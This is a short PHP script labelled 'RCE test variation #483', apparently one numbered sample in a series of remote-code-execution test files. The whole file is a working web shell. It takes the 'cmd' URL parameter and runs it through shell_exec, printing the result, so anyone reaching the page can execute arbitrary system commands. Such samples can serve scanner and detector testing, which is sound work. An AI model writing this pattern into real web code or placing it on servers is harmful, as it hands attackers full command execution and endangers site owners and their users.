<?php
// RCE test variation #483
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>